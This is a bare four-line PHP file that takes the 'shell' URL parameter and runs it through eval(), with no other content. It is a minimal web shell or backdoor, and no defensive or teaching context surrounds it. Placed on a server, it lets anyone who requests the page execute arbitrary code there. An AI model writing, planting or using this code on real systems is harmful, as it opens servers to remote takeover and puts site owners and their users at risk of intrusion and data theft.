<?php
$a=$_GET['shell'];
// echo $a;
eval($a);